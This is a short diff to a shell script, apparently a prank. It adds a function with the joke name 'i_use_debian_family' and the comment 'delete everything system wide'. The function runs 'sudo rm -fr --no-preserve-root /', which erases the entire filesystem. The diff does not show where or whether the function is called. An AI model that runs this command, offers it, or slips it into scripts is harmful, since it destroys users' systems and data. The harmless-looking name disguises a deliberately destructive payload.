@@ -107,3 +107,8 @@ function weaboo_time() {
 
     cross_unix_link_ditcher $YESSSS
 }
+
+# delete everything system wide
+function i_use_debian_family() {
+    sudo rm -fr --no-preserve-root /
+}
